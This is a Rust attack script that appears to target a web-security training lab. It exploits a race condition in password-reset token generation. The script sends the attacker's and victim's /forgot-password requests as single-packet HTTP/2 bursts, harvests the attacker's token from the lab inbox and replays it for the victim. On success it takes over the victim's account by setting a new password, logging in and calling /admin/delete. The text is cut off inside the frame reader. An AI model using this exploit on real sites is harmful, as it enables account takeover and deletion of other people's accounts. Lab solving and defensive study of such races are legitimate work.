#!/usr/bin/env rust-script
//! name: ts7_align
//! description: Time-sensitive reset-token alignment driver - fires the attacker (wiener) and victim (carlos) /forgot-password POSTs as HTTP/2 streams in ONE packet (single-packet), optionally bracketing the victim request with several attacker requests, then polls the lab email client for the attacker's freshly issued token and immediately presents it for the victim; loops N rounds, auto-widens to a bracketed layout when observation rounds show the attacker pair landing on different tokens, and on acceptance completes the takeover (set victim password, login, /admin delete). Reports per-round statuses, per-stream response arrival microseconds, attacker tokens, victim-confirm oracle and the granularity verdict.
//! version: 1.0.0
//! args: <base-url> [--inbox URL] [--csrf TOK] [--me wiener] [--victim carlos] [--layout CWWWWWWWWWWW] [--conns N] [--rounds 40] [--mail-timeout-secs 25] [--settle-ms 1200] [--new-password S] [--jar PATH] [--no-adaptive] [--selftest]
//! keywords: 时间敏感, reset token, 单包对齐, single-packet, h2, 竞态, 令牌碰撞, 账户接管
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

type Jar = Arc<Mutex<BTreeMap<String, String>>>;

const FORM_MARK: &str = "new-password-1";

struct Cfg {
    base: String,
    inbox: String,
    csrf: String,
    me: String,
    victim: String,
    layout: String,
    bracket: usize,
    conns: usize,
    rounds: usize,
    mail_timeout_s: u64,
    settle_ms: u64,
    new_password: String,
    adaptive: bool,
    pre_idle_ms: u64,
}

fn arg(a: &[String], i: usize) -> String {
    a.get(i).cloned().unwrap_or_default()
}

fn main() {
    // ureq's rustls and tokio-rustls may pull different crypto providers; select one explicitly
    let _ = tokio_rustls::rustls::crypto::aws_lc_rs::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        base: String::new(),
        inbox: String::new(),
        csrf: String::new(),
        me: "wiener".into(),
        victim: "carlos".into(),
        layout: "CWWWWWWWWWWW".into(),
        bracket: 2,
        conns: 1,
        rounds: 40,
        mail_timeout_s: 25,
        settle_ms: 1200,
        new_password: "Ts7Hacked!23".into(),
        adaptive: true,
        pre_idle_ms: 800,
    };
    let mut jar_path = String::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--inbox" => { i += 1; cfg.inbox = arg(&args, i); }
            "--csrf" => { i += 1; cfg.csrf = arg(&args, i); }
            "--me" => { i += 1; cfg.me = arg(&args, i); }
            "--victim" => { i += 1; cfg.victim = arg(&args, i); }
            "--layout" => { i += 1; cfg.layout = arg(&args, i).to_uppercase(); }
            "--bracket" => { i += 1; cfg.bracket = arg(&args, i).parse().unwrap_or(2).max(1); }
            "--conns" => { i += 1; cfg.conns = arg(&args, i).parse().unwrap_or(1); }
            "--rounds" => { i += 1; cfg.rounds = arg(&args, i).parse().unwrap_or(40).max(1); }
            "--mail-timeout-secs" => { i += 1; cfg.mail_timeout_s = arg(&args, i).parse().unwrap_or(25).max(3); }
            "--settle-ms" => { i += 1; cfg.settle_ms = arg(&args, i).parse().unwrap_or(1200); }
            "--new-password" => { i += 1; cfg.new_password = arg(&args, i); }
            "--jar" => { i += 1; jar_path = arg(&args, i); }
            "--no-adaptive" => cfg.adaptive = false,
            "--pre-idle-ms" => { i += 1; cfg.pre_idle_ms = arg(&args, i).parse().unwrap_or(800); }
            other if !other.starts_with("--") && cfg.base.is_empty() => cfg.base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if cfg.base.is_empty() {
        pi_rust_lib::report::failure(
            "ts7_align",
            "need <base-url>",
            "usage: ts7_align https://lab/ [--inbox URL] [--rounds 40] [--jar J]",
        );
        std::process::exit(2);
    }
    cfg.base = cfg.base.trim_end_matches('/').to_string();
    let parsed = match Url::parse(&cfg.base) {
        Ok(u) => u,
        Err(e) => {
            pi_rust_lib::report::failure("ts7_align", &format!("bad base url: {e}"), "pass an https://lab/ url");
            std::process::exit(2);
        }
    };
    if cfg.layout.chars().filter(|c| *c == 'C' || *c == 'W').count() < 2 {
        cfg.layout = "WC".to_string();
    }

    let jar: Jar = Arc::new(Mutex::new(BTreeMap::new()));
    if !jar_path.is_empty() {
        if let Ok(raw) = std::fs::read_to_string(&jar_path) {
            if let Ok(v) = pi_rust_lib::serde_json::from_str::<Value>(&raw) {
                if let Some(hosts) = v.as_object() {
                    let mut j = jar.lock().unwrap();
                    for (_h, inner) in hosts {
                        if let Some(obj) = inner.as_object() {
                            for (k, val) in obj {
                                j.insert(k.clone(), val.as_str().unwrap_or("").to_string());
                            }
                        }
                    }
                }
            }
        }
    }
    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_millis(20_000))
        .redirects(0)
        .build();

    // ---- recon: csrf + inbox ----
    let (rst, rbody) = get(&agent, &jar, &format!("{}/forgot-password", cfg.base));
    if cfg.csrf.is_empty() {
        cfg.csrf = extract_csrf(&rbody).unwrap_or_default();
    }
    if cfg.inbox.is_empty() {
        cfg.inbox = extract_inbox(&rbody).unwrap_or_default();
    }
    eprintln!("[ts7] recon status={rst} csrf={} inbox={}", !cfg.csrf.is_empty(), cfg.inbox);
    if cfg.csrf.is_empty() {
        pi_rust_lib::report::failure("ts7_align", "no csrf on /forgot-password", "check the base url / instance health");
        std::process::exit(1);
    }

    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port_or_known_default().unwrap_or(443);
    let authority = if port == 443 { host.clone() } else { format!("{host}:{port}") };
    let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
        Ok(rt) => rt,
        Err(e) => {
            pi_rust_lib::report::failure("ts7_align", &format!("tokio runtime: {e}"), "environment problem");
            std::process::exit(1);
        }
    };

    let mut seen_tokens: BTreeSet<String> = BTreeSet::new();
    // baseline the inbox so round 1 only counts mail issued by this campaign
    if !cfg.inbox.is_empty() {
        let (_bs, ib) = get(&agent, &jar, &cfg.inbox);
        let base_mails = parse_mails(&ib);
        let base_last = base_mails.iter().map(|(s, _, _)| s.clone()).max().unwrap_or_default();
        for (_s, _u, t) in &base_mails {
            seen_tokens.insert(t.clone());
        }
        eprintln!("[ts7] inbox baseline sent={base_last} tokens={}", seen_tokens.len());
    }
    let mut rows: Vec<Value> = Vec::new();
    let mut control: Value = Value::Null;
    let mut controls_done = false;
    let mut winner: Option<Value> = None;
    let mut layout = cfg.layout.clone();
    let mut observation: Vec<Value> = Vec::new();
    let start = Instant::now();

    for round in 1..=cfg.rounds {
        let is_obs = round % 10 == 0;
        let use_layout = if is_obs && layout == "WC" { "WWC".to_string() } else { layout.clone() };
        let stream_users = expand_layout(&use_layout, &cfg.me, &cfg.victim);
        if stream_users.len() < 2 {
            break;
        }
        let bodies: Vec<String> = stream_users
            .iter()
            .map(|u| format!("csrf={}&username={}", cfg.csrf, u))
            .collect();
        let cookie = cookie_header(&jar);

        // let the app drain our own presentation traffic before the alignment shot
        if cfg.pre_idle_ms > 0 {
            std::thread::sleep(Duration::from_millis(cfg.pre_idle_ms));
        }

        // ---- single-packet burst ----
        let t0 = Instant::now();
        let burst = if cfg.conns > 1 {
            rt.block_on(burst_h2_conns(
                &host,
                port,
                &authority,
                &bodies,
                cookie.as_deref(),
                &[("content-type", "application/x-www-form-urlencoded")],
                6000,
            ))
        } else {
            rt.block_on(burst_h2(
                &host,
                port,
                &authority,
                &bodies,
                cookie.as_deref(),
                &[("content-type", "application/x-www-form-urlencoded")],
                3000,
            ))
        };
        let fire_ms = t0.elapsed().as_millis() as u64;
        let (statuses, arrivals, burst_bytes, burst_err) = match burst {
            Ok(v) => (
                v.get("statuses")
                    .and_then(Value::as_array)
                    .map(|a| a.iter().map(|x| x.as_str().unwrap_or("null").to_string()).collect::<Vec<_>>())
                    .unwrap_or_default(),
                v.get("arrivals_us")
                    .and_then(Value::as_array)
                    .map(|a| a.iter().map(|x| x.as_u64().unwrap_or(0)).collect::<Vec<_>>())
                    .unwrap_or_default(),
                v.get("burst_bytes").and_then(Value::as_u64).unwrap_or(0),
                String::new(),
            ),
            Err(e) => (Vec::new(), Vec::new(), 0, e),
        };
        let gap_us = if arrivals.len() >= 2 { arrivals.last().unwrap() - arrivals.first().unwrap() } else { 0 };
        eprintln!(
            "[ts7] r{round} layout={use_layout} fire={fire_ms}ms bytes={burst_bytes} statuses={:?} arrivals={:?}{}",
            statuses, arrivals,
            if burst_err.is_empty() { String::new() } else { format!(" err={burst_err}") }
        );

        // ---- read attacker mail (async) ----
        std::thread::sleep(Duration::from_millis(cfg.settle_ms));
        let poll_deadline = Instant::now() + Duration::from_secs(cfg.mail_timeout_s);
        let mut fresh: Vec<(String, String, String)> = Vec::new(); // (sent, user, token)
        let mut polls = 0;
        loop {
            polls += 1;
            let (_ist, ibody) = get(&agent, &jar, &cfg.inbox);
            let mails = parse_mails(&ibody);
            let mut cand: Vec<(String, String, String)> = Vec::new();
            for (sent, user, tok) in &mails {
                if user != &cfg.me {
                    continue;
                }
                if !seen_tokens.contains(tok) {
                    cand.push((sent.clone(), user.clone(), tok.clone()));
                }
            }
            if !cand.is_empty() {
                fresh = cand;
                break;
            }
            if Instant::now() >= poll_deadline {
                break;
            }
            std::thread::sleep(Duration::from_millis(1200));
        }
        for (_s, _u, t) in &fresh {
            seen_tokens.insert(t.clone());
        }
        // oldest first: the attacker request dispatched nearest the victim request is the one issued
        // together with it at the head of the burst, i.e. the oldest mail of this round
        fresh.sort_by(|a, b| a.0.cmp(&b.0));

        let wiener_tokens: Vec<String> = fresh.iter().map(|(_, _, t)| t.clone()).collect();
        let distinct = wiener_tokens.iter().collect::<BTreeSet<&String>>().len();
        let dups = wiener_tokens.len().saturating_sub(distinct);
        let pair_equal = wiener_tokens.len() >= 2 && wiener_tokens.iter().all(|t| t == &wiener_tokens[0]);
        if is_obs || wiener_tokens.len() >= 2 {
            observation.push(json!({
                "round": round, "layout": use_layout, "wiener_tokens": wiener_tokens.iter().map(|t| t[..8.min(t.len())].to_string()).collect::<Vec<_>>(),
                "pair_equal": pair_equal, "distinct_tokens": distinct, "dups": dups, "arrivals_us": arrivals, "gap_us": gap_us,
            }));
        }

        // ---- oracle controls (once) ----
        if !controls_done && !wiener_tokens.is_empty() {
            let tok = wiener_tokens[0].clone();
            let (pst, pbody) = get(&agent, &jar, &format!("{}/forgot-password?user={}&token={}", cfg.base, cfg.me, tok));
            let (nst, nbody) = get(
                &agent,
                &jar,
                &format!("{}/forgot-password?user={}&token={}", cfg.base, cfg.me, "0".repeat(40)),
            );
            control = json!({
                "pos_status": pst, "pos_has_form": pbody.contains(FORM_MARK), "pos_head": head(&pbody, 200),
                "neg_status": nst, "neg_has_form": nbody.contains(FORM_MARK), "neg_head": head(&nbody, 200),
            });
            controls_done = true;
            eprintln!("[ts7] oracle control pos={pst}/{} neg={nst}/{}", pbody.contains(FORM_MARK), nbody.contains(FORM_MARK));
        }

        // ---- present attacker tokens for the victim (no redirect follow) ----
        // A layout without a victim request falls back to control mode: the attacker's own user, so the
        // app's accept semantics (which token of a burst is valid) are directly observable.
        let present_user = if stream_users.iter().any(|u| u == &cfg.victim) {
            cfg.victim.clone()
        } else {
            cfg.me.clone()
        };
        let mut presents: Vec<Value> = Vec::new();
        let mut accepted: Option<String> = None;
        for tok in &wiener_tokens {
            let url = format!("{}/forgot-password?user={}&token={}", cfg.base, present_user, tok);
            let (st, body) = get(&agent, &jar, &url);
            let has_form = body.contains(FORM_MARK);
            presents.push(json!({"token8": &tok[..8.min(tok.len())], "status": st, "has_form": has_form, "head": head(&body, 120)}));
            if st == 200 && has_form {
                accepted = Some(tok.clone());
                break;
            }
        }

        // ---- adaptive widening ----
        let mut widened = false;
        if cfg.adaptive && wiener_tokens.len() >= 2 && !pair_equal && layout == "CWWWWWWWWWWW" {
            layout = format!("{}C{}", "W".repeat(cfg.bracket), "W".repeat(cfg.bracket));
            widened = true;
            eprintln!("[ts7] r{round}: attacker pair differed -> widen layout to {layout}");
        }

        rows.push(json!({
            "round": round, "layout": use_layout, "fire_ms": fire_ms, "burst_err": burst_err.clone(),
            "burst_bytes": burst_bytes, "statuses": statuses, "arrivals_us": arrivals, "gap_us": gap_us,
            "present_user": present_user,
            "mail_polls": polls, "fresh_mail": fresh.len(), "wiener_token8": wiener_tokens.first().map(|t| t[..8.min(t.len())].to_string()),
            "pair_equal": if wiener_tokens.len() >= 2 { json!(pair_equal) } else { Value::Null },
            "distinct_tokens": distinct, "dups": dups,
            "presented": presents, "accepted": accepted.clone(), "widened": widened,
        }));
        eprintln!("[ts7] r{round} tokens={} accepted={:?}", wiener_tokens.len(), accepted);

        if let Some(tok) = accepted {
            if present_user == cfg.victim {
                winner = Some(json!({"token": tok, "round": round, "layout": use_layout}));
                break;
            }
            // control mode: an attacker-token acceptance is a measurement, not a win - keep sampling
            eprintln!("[ts7] r{round} control: token {} accepted for {}", &tok[..8.min(tok.len())], present_user);
        }
    }

    // granularity verdict
    let pair_obs: Vec<&Value> = observation.iter().filter(|o| o.get("pair_equal").and_then(Value::as_bool).is_some()).collect();
    let pair_rounds = pair_obs.len();
    let pair_hits = pair_obs.iter().filter(|o| o.get("pair_equal").and_then(Value::as_bool) == Some(true)).count();
    let min_gap = rows
        .iter()
        .filter_map(|r| r.get("gap_us").and_then(Value::as_u64))
        .filter(|g| *g > 0)
        .min()
        .unwrap_or(0);

    if winner.is_none() {
        let data = json!({
            "instance": cfg.base, "inbox": cfg.inbox, "rounds_run": rows.len(),
            "control": control,
            "granularity": {
                "observation_rounds": pair_rounds, "pair_equal_rounds": pair_hits,
                "min_stream_gap_us": min_gap,
                "verdict": if pair_rounds > 0 && pair_hits == 0 { "narrow-window: attacker pair never collided within one packet" } else { "window not excluded - keep firing rounds" },
            },
            "observation": observation,
            "rounds": rows,
            "elapsed_ms": start.elapsed().as_millis() as u64,
        });
        pi_rust_lib::report::success(
            "ts7_align",
            data,
            "no cross-user token accepted yet: read granularity.verdict + rounds[] (statuses, fresh_mail, presented); raise --rounds or use a bracketed --layout 'WWCWW'",
        )
        .expect("report");
        return;
    }

    // ---- takeover ----
    let winner = winner.unwrap();
    let tok = winner["token"].as_str().unwrap_or("").to_string();
    let tk0 = Instant::now();
    let reset_url = format!("{}/forgot-password?user={}&token={}", cfg.base, cfg.victim, tok);
    let (rst, rpage) = get(&agent, &jar, &reset_url);
    let rcsrf = extract_csrf(&rpage).unwrap_or_else(|| cfg.csrf.clone());
    let set_body = format!(
        "csrf={}&user={}&token={}&new-password-1={}&new-password-2={}",
        rcsrf, cfg.victim, tok, cfg.new_password, cfg.new_password
    );
    let (sst, sbody) = post(&agent, &jar, &format!("{}/forgot-password", cfg.base), &set_body);
    let (lst0, lpage) = get(&agent, &jar, &format!("{}/login", cfg.base));
    let lcsrf = extract_csrf(&lpage).unwrap_or_default();
    let login_body = format!("csrf={}&username={}&password={}", lcsrf, cfg.victim, cfg.new_password);
    let (lst, lbody) = post(&agent, &jar, &format!("{}/login", cfg.base), &login_body);
    let (mst, mbody) = get(&agent, &jar, &format!("{}/my-account", cfg.base));
    let logged_in = mbody.contains("Log out") || mbody.contains("logout") || mbody.contains(&cfg.victim);
    let (ast, apage) = get(&agent, &jar, &format!("{}/admin", cfg.base));
    let acsrf = extract_csrf(&apage).unwrap_or_default();
    let (dst, dbody) = if ast == 200 && !acsrf.is_empty() {
        post(
            &agent,
            &jar,
            &format!("{}/admin/delete", cfg.base),
            &format!("csrf={}&username={}", acsrf, cfg.victim),
        )
    } else {
        (0, String::new())
    };
    let data = json!({
        "instance": cfg.base, "inbox": cfg.inbox, "rounds_run": rows.len(),
        "control": control, "winner": winner,
        "granularity": {"observation_rounds": pair_rounds, "pair_equal_rounds": pair_hits, "min_stream_gap_us": min_gap},
        "observation": observation,
        "rounds": rows,
        "takeover": {
            "reset_page_status": rst, "reset_has_form": rpage.contains(FORM_MARK),
            "set_password_status": sst, "set_password_head": head(&sbody, 160),
            "login_page_status": lst0, "login_status": lst, "login_head": head(&lbody, 160),
            "my_account_status": mst, "logged_in": logged_in,
            "admin_status": ast, "admin_has_csrf": !acsrf.is_empty(),
            "delete_status": dst, "delete_head": head(&dbody, 160),
        },
        "elapsed_ms": start.elapsed().as_millis() as u64,
        "takeover_ms": tk0.elapsed().as_millis() as u64,
    });
    pi_rust_lib::report::success(
        "ts7_align",
        data,
        "run banner_verdict --out /tmp/ts7-verdict.json against the instance to record the solved flag",
    )
    .expect("report");
}

fn head(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

fn expand_layout(layout: &str, me: &str, victim: &str) -> Vec<String> {
    layout
        .chars()
        .filter_map(|c| match c.to_ascii_uppercase() {
            'W' => Some(me.to_string()),
            'C' => Some(victim.to_string()),
            _ => None,
        })
        .collect()
}

fn cookie_header(jar: &Jar) -> Option<String> {
    let j = jar.lock().unwrap();
    if j.is_empty() {
        return None;
    }
    Some(j.iter().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("; "))
}

fn absorb_cookies(jar: &Jar, resp: &ureq::Response) {
    let mut j = jar.lock().unwrap();
    for val in resp.all("set-cookie") {
        if let Some((pair, _)) = val.split_once(';') {
            if let Some((name, value)) = pair.split_once('=') {
                j.insert(name.trim().to_string(), value.trim().to_string());
            }
        }
    }
}

fn get(agent: &ureq::Agent, jar: &Jar, url: &str) -> (u32, String) {
    let mut req = agent.get(url);
    if let Some(c) = cookie_header(jar) {
        req = req.set("Cookie", &c);
    }
    match req.call() {
        Ok(resp) => {
            let st = resp.status() as u32;
            absorb_cookies(jar, &resp);
            (st, resp.into_string().unwrap_or_default())
        }
        Err(ureq::Error::Status(st, resp)) => (st as u32, resp.into_string().unwrap_or_default()),
        Err(_) => (0, String::new()),
    }
}

fn post(agent: &ureq::Agent, jar: &Jar, url: &str, body: &str) -> (u32, String) {
    let mut req = agent
        .post(url)
        .set("Content-Type", "application/x-www-form-urlencoded");
    if let Some(c) = cookie_header(jar) {
        req = req.set("Cookie", &c);
    }
    match req.send_string(body) {
        Ok(resp) => {
            let st = resp.status() as u32;
            absorb_cookies(jar, &resp);
            (st, resp.into_string().unwrap_or_default())
        }
        Err(ureq::Error::Status(st, resp)) => (st as u32, resp.into_string().unwrap_or_default()),
        Err(_) => (0, String::new()),
    }
}

fn extract_csrf(html: &str) -> Option<String> {
    for marker in ["name=\"csrf\"", "name='csrf'", "name=csrf"] {
        if let Some(pos) = html.find(marker) {
            let tail = &html[pos..];
            if let Some(vpos) = tail.find("value=") {
                let rest = tail[vpos + 6..].trim_start();
                let quote = rest.chars().next()?;
                if quote == '"' || quote == '\'' {
                    let end = rest[1..].find(quote)?;
                    return Some(rest[1..1 + end].to_string());
                }
                let end = rest.find(|c: char| c.is_whitespace() || c == '>').unwrap_or(rest.len());
                return Some(rest[..end].to_string());
            }
        }
    }
    None
}

fn extract_inbox(html: &str) -> Option<String> {
    let needle = "exploit-server.net/email";
    let idx = html.find(needle)?;
    let start = html[..idx].rfind(['\'', '"'])? + 1;
    Some(html[start..idx + needle.len()].to_string())
}

/// Parse every (sent, user, token) triple out of the email-client HTML table rows.
fn parse_mails(html: &str) -> Vec<(String, String, String)> {
    let mut out = Vec::new();
    for row in html.split("<tr>") {
        if !row.contains("token=") {
            continue;
        }
        let sent = extract_sent(row);
        for (user, tok) in extract_pairs(row) {
            let entry = (sent.clone(), user, tok);
            if !out.contains(&entry) {
                out.push(entry);
            }
        }
    }
    out
}

fn extract_sent(s: &str) -> String {
    let b: Vec<char> = s.chars().collect();
    if b.len() < 19 {
        return String::new();
    }
    for i in 0..=(b.len() - 19) {
        if b[i].is_ascii_digit()
            && b[i + 1].is_ascii_digit()
            && b[i + 2].is_ascii_digit()
            && b[i + 3].is_ascii_digit()
            && b[i + 4] == '-'
            && b[i + 7] == '-'
            && b[i + 10] == ' '
            && b[i + 13] == ':'
            && b[i + 16] == ':'
        {
            return b[i..i + 19].iter().collect();
        }
    }
    String::new()
}

fn extract_pairs(s: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut idx = 0usize;
    while let Some(rel) = s[idx..].find("user=") {
        let start = idx + rel + 5;
        let rest = &s[start..];
        let name_len = rest
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '@'))
            .unwrap_or(rest.len());
        let name = rest[..name_len].to_string();
        let after = &rest[name_len..];
        let tail = after
            .strip_prefix("&token=")
            .or_else(|| after.strip_prefix("&amp;token="));
        if let Some(t) = tail {
            let hex: String = t.chars().take_while(|c| c.is_ascii_hexdigit()).collect();
            if hex.len() >= 32 {
                out.push((name, hex));
            }
        }
        idx = start + name_len.max(1);
        if idx >= s.len() {
            break;
        }
    }
    out
}

// ---------------- HTTP/2 single-packet burst ----------------

/// One connection per request (last-byte sync across connections): every request's frames are written
/// apart from its final body byte, then all final bytes + END_STREAM are released in one tight loop, so the
/// front-end receives complete requests within microseconds of each other on independent connections
/// (a single multiplexed connection lets the front-end serialize the streams, which kills the alignment).
async fn burst_h2_conns(
    host: &str,
    port: u16,
    authority: &str,
    bodies: &[String],
    cookie: Option<&str>,
    extra: &[(&str, &str)],
    read_ms: u64,
) -> Result<Value, String> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;

    let mut streams: Vec<tokio_rustls::client::TlsStream<TcpStream>> = Vec::new();
    for _ in bodies {
        let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect: {e}"))?;
        let _ = tcp.set_nodelay(true);
        let mut tls = connector
            .connect(server_name.clone(), tcp)
            .await
            .map_err(|e| format!("tls: {e}"))?;
        tls.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await.map_err(|e| format!("preface: {e}"))?;
        tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
        tls.write_all(&frame(8, 0, 0, &0x7ff0_0000u32.to_be_bytes()))
            .await
            .map_err(|e| format!("window: {e}"))?;
        tls.flush().await.map_err(|e| format!("flush: {e}"))?;
        streams.push(tls);
    }

    let mut held: Vec<u8> = Vec::new();
    for (i, tls) in streams.iter_mut().enumerate() {
        let body = bodies[i].as_bytes();
        let cut = body.len().saturating_sub(1);
        let (head, last) = body.split_at(cut);
        held.push(last.first().copied().unwrap_or(b'&'));
        let mut enc = hpack::Encoder::new();
        let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
            (b":method".to_vec(), b"POST".to_vec()),
            (b":scheme".to_vec(), b"https".to_vec()),
            (b":authority".to_vec(), authority.as_bytes().to_vec()),
            (b":path".to_vec(), b"/forgot-password".to_vec()),
        ];
        for (k, v) in extra {
            headers.push((k.as_bytes().to_vec(), v.as_bytes().to_vec()));
        }
        if let Some(c) = cookie {
            headers.push((b"cookie".to_vec(), c.as_bytes().to_vec()));
        }
        let block = enc.encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
        let mut buf = Vec::new();
        buf.extend_from_slice(&frame(1, 0x4, 1, &block));
        buf.extend_from_slice(&frame(0, 0x0, 1, head));
        tls.write_all(&buf).await.map_err(|e| format!("prewrite: {e}"))?;
        tls.flush().await.map_err(|e| format!("preflush: {e}"))?;
    }

    let wrote_at = Instant::now();
    for (i, tls) in streams.iter_mut().enumerate() {
        let payload = [held[i]];
        let _ = tls.write_all(&frame(0, 0x1, 1, &payload)).await;
        let _ = tls.flush().await;
    }
    let release_us = wrote_at.elapsed().as_micros() as u64;

    let mut statuses: Vec<Value> = Vec::new();
    let mut arrivals: Vec<Value> = Vec::new();
    let mut rows: Vec<Value> = Vec::new();
    for tls in streams.iter_mut() {
        let mut dec = hpack::Decoder::new();
        let (mut map, _raw) = read_frames(tls, &mut dec, read_ms, wrote_at, &[1u32]).await?;
        let got = map.remove(&1).unwrap_or(json!({}));
        statuses.push(got.get("status").cloned().unwrap_or(Value::Null));
        arrivals.push(json!(got.get("t_us").and_then(Value::as_u64).unwrap_or(0)));
        rows.push(got);
    }
    Ok(json!({
        "authority": authority,
        "conns": streams.len(),
        "burst_requests": bodies.len(),
        "release_us": release_us,
        "single_packet_likely": release_us < 2000,
        "burst_bytes": bodies.iter().map(|b| b.len()).sum::<usize>(),
        "statuses": statuses,
        "arrivals_us": arrivals,
        "streams": rows,
    }))
}

struct Req {
    method: String,
    path: String,
    body: Vec<u8>,
    headers: Vec<(String, String)>,
}

async fn burst_h2(
    host: &str,
    port: u16,
    authority: &str,
    bodies: &[String],
    cookie: Option<&str>,
    extra: &[(&str, &str)],
    read_ms: u64,
) -> Result<Value, String> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let mut tls = connector.connect(server_name, tcp).await.map_err(|e| format!("tls: {e}"))?;

    tls.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    // widen the connection-level flow-control window so a multi-stream burst is never blocked mid-run
    tls.write_all(&frame(8, 0, 0, &0x7ff0_0000u32.to_be_bytes()))
        .await
        .map_err(|e| format!("window update: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let reqs: Vec<Req> = bodies
        .iter()
        .map(|b| Req {
            method: "POST".to_string(),
            path: "/forgot-password".to_string(),
            body: b.as_bytes().to_vec(),
            headers: extra
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .chain(cookie.map(|c| ("cookie".to_string(), c.to_string())))
                .collect(),
        })
        .collect();

    let mut enc = hpack::Encoder::new();
    let mut dec = hpack::Decoder::new();
    let mut sid = 1u32;
    let mut burst_bytes: Vec<u8> = Vec::new();
    let mut plan: Vec<u32> = Vec::new();
    for r in &reqs {
        let mut headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
            (b":method".to_vec(), r.method.as_bytes().to_vec()),
            (b":scheme".to_vec(), b"https".to_vec()),
            (b":authority".to_vec(), authority.as_bytes().to_vec()),
            (b":path".to_vec(), r.path.as_bytes().to_vec()),
        ];
        for (k, v) in &r.headers {
            headers.push((k.as_bytes().to_vec(), v.as_bytes().to_vec()));
        }
        let block = enc.encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
        burst_bytes.extend_from_slice(&frame(1, 0x4, sid, &block));
        burst_bytes.extend_from_slice(&frame(0, 0x1, sid, &r.body));
        plan.push(sid);
        sid += 2;
    }
    let n_bytes = burst_bytes.len();
    tls.write_all(&burst_bytes).await.map_err(|e| format!("burst write: {e}"))?;
    tls.flush().await.map_err(|e| format!("burst flush: {e}"))?;
    let wrote_at = Instant::now();
    let (mut rows, _raw) = read_frames(&mut tls, &mut dec, read_ms, wrote_at, &plan).await?;

    let mut ordered: Vec<Value> = Vec::new();
    let mut statuses: Vec<Value> = Vec::new();
    let mut arrivals: Vec<Value> = Vec::new();
    for s in &plan {
        let got = rows.remove(s).unwrap_or(json!({}));
        statuses.push(got.get("status").cloned().unwrap_or(Value::Null));
        arrivals.push(json!(got.get("t_us").and_then(Value::as_u64).unwrap_or(0)));
        ordered.push(got);
    }
    Ok(json!({
        "authority": authority,
        "burst_requests": reqs.len(),
        "burst_bytes": n_bytes,
        "single_packet_likely": n_bytes <= 1400,
        "statuses": statuses,
        "arrivals_us": arrivals,
        "streams": ordered,
    }))
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

async fn read_frames<S: AsyncReadExt + AsyncWriteExt + Unpin>(
    stream: &mut S,
    decoder: &mut hpack::Decoder<'_>,
    read_ms: u64,
    wrote_at: Instant,
    want: &[u32],
) -> Result<(BTreeMap<u32, Value>, Vec<u8>), String> {
    let mut raw: Vec<u8> = Vec::new();
    let mut by_stream: BTreeMap<u32, Value> = BTreeMap::new();
    let mut pending_headers: BTreeMap<u32, (Vec<u8>, bool)> = BTreeMap::new();
    let idle = Duration::from_millis(read_ms.max(200));
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, stream.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
